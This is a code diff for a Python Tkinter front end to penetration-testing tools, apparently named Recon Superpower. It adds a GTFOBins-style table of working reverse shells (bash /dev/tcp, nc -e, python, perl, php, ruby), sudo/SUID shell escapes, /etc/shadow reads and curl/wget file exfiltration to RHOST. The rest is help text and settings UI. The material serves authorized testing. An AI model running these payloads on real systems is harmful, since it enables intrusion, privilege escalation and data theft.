+
+        # Copy button
+        copy_btn = tk.Button(
+            frame,
+            text="📋 COPY TO CLIPBOARD",
+            font=("Courier", 9, "bold"),
+            bg=self.bg_tertiary,
+            fg=self.accent_cyan,
+            activebackground=self.accent_cyan,
+            activeforeground=self.bg_primary,
+            relief=tk.FLAT,
+            padx=15,
+            pady=8,
+            cursor="hand2",
+            command=lambda: self.copy_to_clipboard(self.lolol_output.get("1.0", tk.END))
+        )
+        copy_btn.grid(row=5, column=0, columnspan=2, pady=10)
+
+        return frame
+
+    def show_lolol_info(self):
+        """Show LOLOL binary information based on selection."""
+        binary = self.lolol_binary.get()
+        function = self.lolol_function.get()
+
+        lolol_data = {
+            "awk": {
+                "Shell": "awk 'BEGIN {system(\"/bin/sh\")}'",
+                "File read": "awk '//' /path/to/file",
+                "File write": "awk 'BEGIN {print \"content\" > \"/path/to/file\"}'",
+                "SUID": "./awk 'BEGIN {system(\"/bin/sh\")}'",
+                "Sudo": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
+                "Reverse shell": "awk 'BEGIN {s=\"/inet/tcp/0/RHOST/RPORT\";while(42){printf \">\" |& s;s |& getline c;if(c){while((c |& getline) > 0)print $0 |& s;close(c)}}}' /dev/null"
+            },
+            "bash": {
+                "Shell": "/bin/bash",
+                "SUID": "./bash -p",
+                "Sudo": "sudo bash",
+                "Reverse shell": "bash -i >& /dev/tcp/RHOST/RPORT 0>&1"
+            },
+            "cat": {
+                "File read": "cat /path/to/file",
+                "SUID": "./cat /etc/shadow",
+                "Sudo": "sudo cat /etc/shadow"
+            },
+            "curl": {
+                "File read": "curl file:///path/to/file",
+                "File upload": "curl -X POST -d @/path/to/file http://RHOST/",
+                "File download": "curl http://RHOST/file -o /path/to/output"
+            },
+            "find": {
+                "Shell": "find . -exec /bin/sh \\; -quit",
+                "SUID": "./find . -exec /bin/sh -p \\; -quit",
+                "Sudo": "sudo find . -exec /bin/sh \\; -quit"
+            },
+            "nmap": {
+                "Shell": "nmap --interactive\\n!sh",
+                "SUID": "./nmap --interactive\\n!sh",
+                "Sudo": "sudo nmap --interactive\\n!sh"
+            },
+            "nc": {
+                "Reverse shell": "nc -e /bin/sh RHOST RPORT",
+                "File upload": "nc -lvnp RPORT > file < /path/to/file",
+                "File download": "nc RHOST RPORT < /path/to/file"
+            },
+            "perl": {
+                "Shell": "perl -e 'exec \"/bin/sh\";'",
+                "SUID": "./perl -e 'exec \"/bin/sh\";'",
+                "Sudo": "sudo perl -e 'exec \"/bin/sh\";'",
+                "Reverse shell": "perl -e 'use Socket;$i=\"RHOST\";$p=RPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+            },
+            "php": {
+                "Shell": "php -r \"system('/bin/sh');\"",
+                "Sudo": "sudo php -r \"system('/bin/sh');\"",
+                "Reverse shell": "php -r '$sock=fsockopen(\"RHOST\",RPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+            },
+            "python": {
+                "Shell": "python -c 'import os; os.system(\"/bin/sh\")'",
+                "SUID": "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
+                "Sudo": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
+                "Reverse shell": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"RHOST\",RPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+            },
+            "python3": {
+                "Shell": "python3 -c 'import os; os.system(\"/bin/sh\")'",
+                "SUID": "./python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
+                "Sudo": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
+                "Reverse shell": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"RHOST\",RPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+            },
+            "ruby": {
+                "Shell": "ruby -e 'exec \"/bin/sh\"'",
+                "Sudo": "sudo ruby -e 'exec \"/bin/sh\"'",
+                "Reverse shell": "ruby -rsocket -e'f=TCPSocket.open(\"RHOST\",RPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+            },
+            "vim": {
+                "Shell": "vim -c ':!/bin/sh'",
+                "SUID": "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
+                "Sudo": "sudo vim -c ':!/bin/sh'"
+            },
+            "wget": {
+                "File download": "wget http://RHOST/file -O /path/to/output",
+                "File upload": "wget --post-file=/path/to/file http://RHOST/"
+            }
+        }
+
+        # Get info for selected binary and function
+        binary_data = lolol_data.get(binary, {})
+        info = binary_data.get(function, f"No {function} technique available for {binary}")
+
+        self.lolol_output.delete("1.0", tk.END)
+        self.lolol_output.insert("1.0", f"Binary: {binary}\nFunction: {function}\n\n{info}\n\n")
+        self.lolol_output.insert(tk.END, "Replace RHOST and RPORT with your target values.")
+
+    def create_help_tab(self):
+        """Create the Help tab with comprehensive guide."""
+        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
+        frame.columnconfigure(0, weight=1)
+        frame.rowconfigure(1, weight=1)
+
+        # Header
+        header = tk.Label(
+            frame,
+            text="❓ HELP & DOCUMENTATION",
+            font=("Courier", 14, "bold"),
+            fg=self.accent_cyan,
+            bg=self.bg_secondary
+        )
+        header.grid(row=0, column=0, sticky=tk.EW, padx=10, pady=15)
+
+        # Help content
+        help_text = scrolledtext.ScrolledText(
+            frame, font=("Courier", 10),
+            bg=self.bg_primary, fg=self.text_color,
+            insertbackground=self.accent_cyan,
+            wrap=tk.WORD
+        )
+        help_text.grid(row=1, column=0, sticky=tk.NSEW, padx=10, pady=10)
+
+        help_content = """
+╔══════════════════════════════════════════════════════════════════════╗
+║                    RECON SUPERPOWER v3.0 GUIDE                      ║
+╚══════════════════════════════════════════════════════════════════════╝
+
+⚠️  LEGAL DISCLAIMER
+This tool is for AUTHORIZED security testing only. Always obtain proper
+authorization before scanning any systems.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📋 QUICK START
+1. Select a tool from the left sidebar
+2. Configure the options in the center panel
+3. Click "RUN SCAN" to execute
+4. View results in the output console on the right
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🛠️  AVAILABLE TOOLS
+
+🔍 NMAP - Network Scanner
+   • Port scanning and service detection
+   • NSE script support for vulnerability scanning
+   • Multiple scan types (SYN, Connect, UDP, etc.)
+
+📁 GOBUSTER - Directory Brute-forcer
+   • Find hidden directories and files
+   • DNS subdomain enumeration
+   • Virtual host discovery
+
+🔐 NIKTO - Web Vulnerability Scanner
+   • Identify web server misconfigurations
+   • Check for outdated software
+   • Find dangerous files and scripts
+
+💥 METASPLOIT - Auxiliary Scanners
+   • SMB, SSH, HTTP version detection
+   • Port scanning modules
+   • Service enumeration
+
+🌐 SHODAN - Device Search Engine
+   • Search internet-connected devices
+   • Requires API key (configure in Settings)
+   • Find specific services and vulnerabilities
+
+📡 DNSRECON - DNS Enumeration
+   • Zone transfer attempts
+   • Subdomain brute-forcing
+   • DNS record enumeration
+
+🖥️ ENUM4LINUX - SMB Enumeration
+   • Windows/Samba enumeration
+   • User and share discovery
+   • Password policy extraction
+
+🔎 GITHUB - OSINT
+   • Search GitHub for sensitive data
+   • Find exposed credentials
+   • Discover configuration files
+
+🦀 FEROXBUSTER - Web Discovery
+   • Fast recursive content discovery
+   • Extension filtering
+   • Multi-threaded scanning
+
+☁️ AWS S3 - Bucket Enumeration
+   • Find misconfigured S3 buckets
+   • Download exposed files
+   • Permission testing
+
+📦 TCPDUMP - Packet Capture
+   • Network traffic analysis
+   • Requires root/sudo privileges
+   • BPF filter support
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🆕 NEW FEATURE TABS
+
+🐚 SHELLZ - Reverse Shell Generator
+   • Generate reverse shells in multiple languages
+   • Bash, Python, Perl, PHP, Ruby, PowerShell
+   • One-click copy to clipboard
+
+🔐 ENCODERS
+   • Base64, URL, Hex, Binary encoding
+   • Hash generation (MD5, SHA1, SHA256)
+   • ROT13 and Unicode encoding
+
+🔓 DECODERS
+   • Decode Base64, URL, Hex, Binary
+   • JWT token decoder
+   • Unicode and HTML entity decoding
+
+🎭 LOLOL - Living Off The Land
+   • GTFOBins-style reference
+   • Privilege escalation techniques
+   • File read/write with common binaries
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔄 WORKFLOWS
+
+Automated multi-tool reconnaissance:
+1. Full Network Reconnaissance
+2. Web Application Deep Scan
+3. Domain Intelligence Gathering
+4. Windows/SMB Enumeration
+5. Cloud Asset Discovery
+6. Quick Host Discovery
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+⌨️  KEYBOARD SHORTCUTS
+
+Ctrl+R    Run Scan
+Ctrl+S    Save Output
+Ctrl+L    Clear Console
+Ctrl+F    Search in Output
+Ctrl+C    Copy Selection
+Ctrl+Q    Quit Application
+ESC       Stop Running Scan
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+⚙️  SETTINGS
+
+Configure in the Settings tab:
+• Shodan API Key
+• Wordlist directory path
+• Custom tools path
+• Output directory
+• Process timeout
+• Max output lines
+• UI preferences
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📤 EXPORT OPTIONS
+
+• Text (.txt)
+• JSON (.json)
+• XML (.xml)
+• HTML (.html)
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔗 RESOURCES
+
+• Nmap: https://nmap.org/book/man.html
+• Shodan: https://www.shodan.io/search/filters
+• GTFOBins: https://gtfobins.github.io/
+• HackTheBox: https://www.hackthebox.eu/
+• TryHackMe: https://tryhackme.com/
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+⚡ Happy (Authorized) Reconnaissance! ⚡
+"""
+
+        help_text.insert("1.0", help_content)
+        help_text.config(state=tk.DISABLED)
+
+        return frame
 
     def create_workflows_tab(self):
         """Create the Workflows tab for automated multi-tool reconnaissance."""
@@ -3280,16 +4267,33 @@ payload/                        # BLOCKED
         )
         self.workflow_progress.pack(fill=tk.X, padx=10, pady=(0, 10))
 
+        # Cheat Sheet Button
+        cheat_btn = tk.Button(
+            frame,
+            text="📋 VIEW WORKFLOW GUIDE",
+            font=("Courier", 9, "bold"),
+            bg=self.bg_tertiary,
+            fg=self.accent_cyan,
+            activebackground=self.accent_cyan,
+            activeforeground=self.bg_primary,
+            relief=tk.FLAT,
+            padx=15,
+            pady=8,
+            cursor="hand2",
+            command=lambda: self.show_cheatsheet("workflows")
+        )
+        cheat_btn.grid(row=7, column=0, columnspan=2, pady=10)
+
         # Info label
         info_label = tk.Label(
             frame,
-            text="\n💡 Tips:\n• Workflows automate multi-tool reconnaissance\n• Target format depends on workflow (IP, domain, URL)\n• Results appear in console output below\n• Save workflow results with the SAVE button",
+            text="💡 Tips: Workflows automate multi-tool reconnaissance. Target format depends on workflow.",
             font=("Courier", 8),
             fg=self.accent_cyan,
             bg=self.bg_secondary,
             justify=tk.LEFT
         )
-        info_label.grid(row=7, column=0, columnspan=2, sticky=tk.W, padx=10, pady=10)
+        info_label.grid(row=8, column=0, columnspan=2, sticky=tk.W, padx=10, pady=5)
 
         # Initialize with first workflow
         self.on_workflow_selected(None)
@@ -3996,42 +5000,215 @@ payload/                        # BLOCKED
     def create_settings_tab(self):
         frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
         frame.columnconfigure(1, weight=1)
+        frame.rowconfigure(20, weight=1)  # Allow expansion
+
+        # Create scrollable canvas for settings
+        canvas = tk.Canvas(frame, bg=self.bg_secondary, highlightthickness=0)
+        scrollbar = tk.Scrollbar(frame, orient="vertical", command=canvas.yview)
+        scrollable_frame = tk.Frame(canvas, bg=self.bg_secondary)
+        scrollable_frame.columnconfigure(1, weight=1)
+
+        scrollable_frame.bind(
+            "<Configure>",
+            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
+        )
+
+        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
+        canvas.configure(yscrollcommand=scrollbar.set)
+
+        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
+        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+
+        row = 0
 
         # Settings header
         header = tk.Label(
-            frame,
+            scrollable_frame,
             text="⚙️  APPLICATION SETTINGS",
-            font=("Courier", 12, "bold"),
+            font=("Courier", 14, "bold"),
             fg=self.accent_cyan,
             bg=self.bg_secondary
         )
-        header.grid(row=0, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=15)
+        header.grid(row=row, column=0, columnspan=3, sticky=tk.EW, padx=10, pady=15)
+        row += 1
+
+        # === API KEYS SECTION ===
+        section_label = tk.Label(scrollable_frame, text="━━━ API KEYS ━━━",
+                                font=("Courier", 10, "bold"), fg=self.accent_green, bg=self.bg_secondary)
+        section_label.grid(row=row, column=0, columnspan=3, sticky=tk.W, padx=10, pady=(15, 5))
+        row += 1
 
         # Shodan API Key
-        label = tk.Label(frame, text="Shodan API Key:", font=("Courier", 10),
+        label = tk.Label(scrollable_frame, text="Shodan API Key:", font=("Courier", 10),
                         fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
-        label.grid(row=1, column=0, sticky=tk.W, padx=10, pady=5)
+        label.grid(row=row, column=0, sticky=tk.W, padx=10, pady=5)
 
-        self.settings_shodan_key = tk.Entry(frame, font=("Courier", 10),
+        self.settings_shodan_key = tk.Entry(scrollable_frame, font=("Courier", 10),
                                            bg=self.bg_primary, fg=self.accent_cyan,
                                            insertbackground=self.accent_cyan, relief=tk.FLAT,
                                            show="*", width=30)
-        self.settings_shodan_key.grid(row=1, column=1, sticky=tk.EW, padx=10, pady=5)
+        self.settings_shodan_key.grid(row=row, column=1, sticky=tk.EW, padx=10, pady=5)
         if self.config.get("shodan_api_key"):
             self.settings_shodan_key.insert(0, self.config["shodan_api_key"])
+        row += 1
 
-        # Show/Hide key button
+        # Show/Hide key checkbox
         self.show_key_var = tk.BooleanVar()
-        show_key_check = tk.Checkbutton(frame, text="Show API key", variable=self.show_key_var,
+        show_key_check = tk.Checkbutton(scrollable_frame, text="Show API key", variable=self.show_key_var,
                                        font=("Courier", 9), fg=self.text_color,
                                        bg=self.bg_secondary, selectcolor=self.bg_primary,
                                        command=lambda: self.settings_shodan_key.config(
                                            show="" if self.show_key_var.get() else "*"))
-        show_key_check.grid(row=2, column=1, sticky=tk.W, padx=10, pady=2)
+        show_key_check.grid(row=row, column=1, sticky=tk.W, padx=10, pady=2)
+        row += 1
+
+        # === PATHS SECTION ===
+        section_label = tk.Label(scrollable_frame, text="━━━ PATHS ━━━",
+                                font=("Courier", 10, "bold"), fg=self.accent_green, bg=self.bg_secondary)
+        section_label.grid(row=row, column=0, columnspan=3, sticky=tk.W, padx=10, pady=(15, 5))
+        row += 1
+
+        # Wordlist Path
+        label = tk.Label(scrollable_frame, text="Wordlist Directory:", font=("Courier", 10),
+                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
+        label.grid(row=row, column=0, sticky=tk.W, padx=10, pady=5)
+
+        wordlist_frame = tk.Frame(scrollable_frame, bg=self.bg_secondary)
+        wordlist_frame.grid(row=row, column=1, sticky=tk.EW, padx=10, pady=5)
+        wordlist_frame.columnconfigure(0, weight=1)
+
+        self.settings_wordlist_path = tk.Entry(wordlist_frame, font=("Courier", 10),
+                                              bg=self.bg_primary, fg=self.accent_cyan,
+                                              insertbackground=self.accent_cyan, relief=tk.FLAT)
+        self.settings_wordlist_path.pack(side=tk.LEFT, fill=tk.X, expand=True)
+        self.settings_wordlist_path.insert(0, self.config.get("wordlist_path", "/usr/share/wordlists"))
+
+        browse_btn = tk.Button(wordlist_frame, text="📂", font=("Courier", 9),
+                              bg=self.bg_primary, fg=self.text_color,
+                              relief=tk.FLAT, cursor="hand2",
+                              command=lambda: self.browse_directory(self.settings_wordlist_path))
+        browse_btn.pack(side=tk.RIGHT, padx=(5, 0))
+        row += 1
+
+        # Tools Path
+        label = tk.Label(scrollable_frame, text="Custom Tools Path:", font=("Courier", 10),
+                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
+        label.grid(row=row, column=0, sticky=tk.W, padx=10, pady=5)
+
+        tools_frame = tk.Frame(scrollable_frame, bg=self.bg_secondary)
+        tools_frame.grid(row=row, column=1, sticky=tk.EW, padx=10, pady=5)
+        tools_frame.columnconfigure(0, weight=1)
+
+        self.settings_tools_path = tk.Entry(tools_frame, font=("Courier", 10),
+                                           bg=self.bg_primary, fg=self.accent_cyan,
+                                           insertbackground=self.accent_cyan, relief=tk.FLAT)
+        self.settings_tools_path.pack(side=tk.LEFT, fill=tk.X, expand=True)
+        self.settings_tools_path.insert(0, self.config.get("tools_path", "/usr/bin"))
+
+        browse_btn = tk.Button(tools_frame, text="📂", font=("Courier", 9),
+                              bg=self.bg_primary, fg=self.text_color,
+                              relief=tk.FLAT, cursor="hand2",
+                              command=lambda: self.browse_directory(self.settings_tools_path))
+        browse_btn.pack(side=tk.RIGHT, padx=(5, 0))
+        row += 1
+
+        # Output Directory
+        label = tk.Label(scrollable_frame, text="Output Directory:", font=("Courier", 10),
+                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
+        label.grid(row=row, column=0, sticky=tk.W, padx=10, pady=5)
+
+        output_frame = tk.Frame(scrollable_frame, bg=self.bg_secondary)
+        output_frame.grid(row=row, column=1, sticky=tk.EW, padx=10, pady=5)
+        output_frame.columnconfigure(0, weight=1)
+
+        self.settings_output_path = tk.Entry(output_frame, font=("Courier", 10),
+                                            bg=self.bg_primary, fg=self.accent_cyan,
+                                            insertbackground=self.accent_cyan, relief=tk.FLAT)
+        self.settings_output_path.pack(side=tk.LEFT, fill=tk.X, expand=True)
+        self.settings_output_path.insert(0, self.config.get("output_path", os.path.expanduser("~")))
+
+        browse_btn = tk.Button(output_frame, text="📂", font=("Courier", 9),
+                              bg=self.bg_primary, fg=self.text_color,
+                              relief=tk.FLAT, cursor="hand2",
+                              command=lambda: self.browse_directory(self.settings_output_path))
+        browse_btn.pack(side=tk.RIGHT, padx=(5, 0))
+        row += 1
+
+        # === PERFORMANCE SECTION ===
+        section_label = tk.Label(scrollable_frame, text="━━━ PERFORMANCE ━━━",
+                                font=("Courier", 10, "bold"), fg=self.accent_green, bg=self.bg_secondary)
+        section_label.grid(row=row, column=0, columnspan=3, sticky=tk.W, padx=10, pady=(15, 5))
+        row += 1
+
+        # Process timeout
+        label = tk.Label(scrollable_frame, text="Process Timeout (s):", font=("Courier", 10),
+                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
+        label.grid(row=row, column=0, sticky=tk.W, padx=10, pady=5)
+        self.settings_timeout = tk.Entry(scrollable_frame, font=("Courier", 10),
+                                        bg=self.bg_primary, fg=self.accent_cyan,
+                                        insertbackground=self.accent_cyan, relief=tk.FLAT, width=15)
+        self.settings_timeout.grid(row=row, column=1, sticky=tk.W, padx=10, pady=5)
+        self.settings_timeout.insert(0, str(self.config.get("timeout", 3600)))
+        row += 1
+
+        # Max output lines
+        label = tk.Label(scrollable_frame, text="Max Output Lines:", font=("Courier", 10),
+                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
+        label.grid(row=row, column=0, sticky=tk.W, padx=10, pady=5)
+        self.settings_maxlines = tk.Entry(scrollable_frame, font=("Courier", 10),
+                                         bg=self.bg_primary, fg=self.accent_cyan,
+                                         insertbackground=self.accent_cyan, relief=tk.FLAT, width=15)
+        self.settings_maxlines.grid(row=row, column=1, sticky=tk.W, padx=10, pady=5)
+        self.settings_maxlines.insert(0, str(self.config.get("max_output_lines", 10000)))
+        row += 1
+
+        # Default thread count
+        label = tk.Label(scrollable_frame, text="Default Threads:", font=("Courier", 10),
+                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
+        label.grid(row=row, column=0, sticky=tk.W, padx=10, pady=5)
+        self.settings_default_threads = tk.Entry(scrollable_frame, font=("Courier", 10),
+                                                bg=self.bg_primary, fg=self.accent_cyan,
+                                                insertbackground=self.accent_cyan, relief=tk.FLAT, width=15)
+        self.settings_default_threads.grid(row=row, column=1, sticky=tk.W, padx=10, pady=5)
+        self.settings_default_threads.insert(0, str(self.config.get("default_threads", 10)))
+        row += 1
+
+        # === UI PREFERENCES ===
+        section_label = tk.Label(scrollable_frame, text="━━━ UI PREFERENCES ━━━",
+                                font=("Courier", 10, "bold"), fg=self.accent_green, bg=self.bg_secondary)
+        section_label.grid(row=row, column=0, columnspan=3, sticky=tk.W, padx=10, pady=(15, 5))
+        row += 1
+
+        # Auto-save checkbox
+        self.settings_autosave_var = tk.BooleanVar(value=self.config.get("auto_save", False))
+        autosave_check = tk.Checkbutton(scrollable_frame, text="Auto-save output after each scan",
+                                       variable=self.settings_autosave_var,
+                                       font=("Courier", 10), fg=self.text_color,
+                                       bg=self.bg_secondary, selectcolor=self.bg_primary)
+        autosave_check.grid(row=row, column=0, columnspan=2, sticky=tk.W, padx=10, pady=5)
+        row += 1
+
+        # Show timestamps checkbox
+        self.settings_timestamps_var = tk.BooleanVar(value=self.config.get("show_timestamps", True))
+        timestamps_check = tk.Checkbutton(scrollable_frame, text="Show timestamps in output",
+                                         variable=self.settings_timestamps_var,
+                                         font=("Courier", 10), fg=self.text_color,
+                                         bg=self.bg_secondary, selectcolor=self.bg_primary)
+        timestamps_check.grid(row=row, column=0, columnspan=2, sticky=tk.W, padx=10, pady=5)
+        row += 1
+
+        # Confirm before exit
+        self.settings_confirm_exit_var = tk.BooleanVar(value=self.config.get("confirm_exit", True))
+        confirm_exit_check = tk.Checkbutton(scrollable_frame, text="Confirm before exiting",
+                                           variable=self.settings_confirm_exit_var,
+                                           font=("Courier", 10), fg=self.text_color,
+                                           bg=self.bg_secondary, selectcolor=self.bg_primary)
+        confirm_exit_check.grid(row=row, column=0, columnspan=2, sticky=tk.W, padx=10, pady=5)
+        row += 1
 
         # Save settings button
         save_btn = tk.Button(
-            frame,
+            scrollable_frame,
             text="💾 SAVE SETTINGS",
             font=("Courier", 11, "bold"),
             bg=self.accent_green,
@@ -4043,43 +5220,105 @@ payload/                        # BLOCKED
             cursor="hand2",
             command=self.save_settings
         )
-        save_btn.grid(row=3, column=0, columnspan=2, padx=10, pady=20)
+        save_btn.grid(row=row, column=0, columnspan=2, padx=10, pady=20)
+        row += 1
 
-        # Process timeout
-        self.settings_timeout = self.create_labeled_entry(frame, "Process Timeout (s):", 4, 
-                                                          str(self.config.get("timeout", 3600)))
-
-        # Max output lines
-        self.settings_maxlines = self.create_labeled_entry(frame, "Max Output Lines:", 5,
-                                                           str(self.config.get("max_output_lines", 10000)))
+        # Reset to defaults button
+        reset_btn = tk.Button(
+            scrollable_frame,
+            text="🔄 RESET TO DEFAULTS",
+            font=("Courier", 9, "bold"),
+            bg=self.bg_tertiary,
+            fg=self.accent_red,
+            activebackground=self.accent_red,
+            activeforeground=self.bg_primary,
+            relief=tk.FLAT,
+            padx=15,
+            pady=8,
+            cursor="hand2",
+            command=self.reset_settings
+        )
+        reset_btn.grid(row=row, column=0, columnspan=2, padx=10, pady=5)
+        row += 1
 
         # Info label
         info_label = tk.Label(
-            frame,
-            text="\n📝 Settings are saved to:\n~/.recon_superpower/config.json\n\nChanges take effect immediately",
+            scrollable_frame,
+            text="📝 Settings saved to: ~/.recon_superpower/config.json",
             font=("Courier", 9),
             fg=self.accent_cyan,
             bg=self.bg_secondary,
             justify=tk.LEFT
         )
-        info_label.grid(row=6, column=0, columnspan=2, sticky=tk.W, padx=10, pady=20)
+        info_label.grid(row=row, column=0, columnspan=2, sticky=tk.W, padx=10, pady=20)
 
         return frame
+
+    def browse_directory(self, target_entry):
+        """Browse for a directory and update the target entry."""
+        directory = filedialog.askdirectory(
+            title="Select Directory",
+            initialdir=target_entry.get() or os.path.expanduser("~")
+        )
+        if directory:
+            target_entry.delete(0, tk.END)
+            target_entry.insert(0, directory)
+
+    def reset_settings(self):
+        """Reset settings to defaults."""
+        if messagebox.askyesno("Reset Settings", "Are you sure you want to reset all settings to defaults?"):
+            default_config = {
+                "window_geometry": "1400x900",
+                "timeout": 3600,
+                "max_output_lines": 10000,
+                "auto_save": False,
+                "theme": "dark",
+                "shodan_api_key": "",
+                "wordlist_path": "/usr/share/wordlists",
+                "tools_path": "/usr/bin",
+                "output_path": os.path.expanduser("~"),
+                "default_threads": 10,
+                "show_timestamps": True,
+                "confirm_exit": True
+            }
+            self.config = default_config
+            self.save_config()
+            # Refresh settings UI
+            self.switch_tool("settings")
+            messagebox.showinfo("Settings Reset", "Settings have been reset to defaults.")
 
     def save_settings(self):
         """Save settings from the settings tab."""
         # Update config
         shodan_key = self.settings_shodan_key.get().strip()
         if shodan_key:
-            # SECURITY FIX (MED-4): Validate Shodan API key format (32 hex characters)
-            if not re.match(r'^[a-fA-F0-9]{32}$', shodan_key):
+            # SECURITY FIX (MED-4): Validate Shodan API key format (alphanumeric, typically 32 chars)
+            # Shodan API keys are alphanumeric, not just hex
+            if not re.match(r'^[a-zA-Z0-9]{20,64}$', shodan_key):
                 messagebox.showerror("Invalid API Key",
-                    "Shodan API key must be exactly 32 hexadecimal characters.\\n"
-                    "Format: 0-9, A-F (case insensitive)\\n"
-                    "Example: 1234567890abcdef1234567890abcdef")
+                    "Invalid Shodan API key format.\n"
+                    "API keys should be 20-64 alphanumeric characters.\n"
+                    "Get your API key from: https://account.shodan.io/")
                 return
             self.config["shodan_api_key"] = shodan_key
-        
+
+        # Save paths
+        if hasattr(self, 'settings_wordlist_path'):
+            wordlist_path = self.settings_wordlist_path.get().strip()
+            if wordlist_path and os.path.isdir(wordlist_path):
+                self.config["wordlist_path"] = wordlist_path
+
+        if hasattr(self, 'settings_tools_path'):
+            tools_path = self.settings_tools_path.get().strip()
+            if tools_path and os.path.isdir(tools_path):
+                self.config["tools_path"] = tools_path
+
+        if hasattr(self, 'settings_output_path'):
+            output_path = self.settings_output_path.get().strip()
+            if output_path and os.path.isdir(output_path):
+                self.config["output_path"] = output_path
+
+        # Save performance settings
         try:
             timeout = int(self.settings_timeout.get().strip())
             if timeout > 0:
@@ -4095,6 +5334,24 @@ payload/                        # BLOCKED
                 self.max_output_lines = maxlines
         except ValueError:
             pass
+
+        try:
+            if hasattr(self, 'settings_default_threads'):
+                threads = int(self.settings_default_threads.get().strip())
+                if 1 <= threads <= 1000:
+                    self.config["default_threads"] = threads
+        except ValueError:
+            pass
+
+        # Save UI preferences
+        if hasattr(self, 'settings_autosave_var'):
+            self.config["auto_save"] = self.settings_autosave_var.get()
+
+        if hasattr(self, 'settings_timestamps_var'):
+            self.config["show_timestamps"] = self.settings_timestamps_var.get()
+
+        if hasattr(self, 'settings_confirm_exit_var'):
+            self.config["confirm_exit"] = self.settings_confirm_exit_var.get()
 
         # Save to file
         self.save_config()
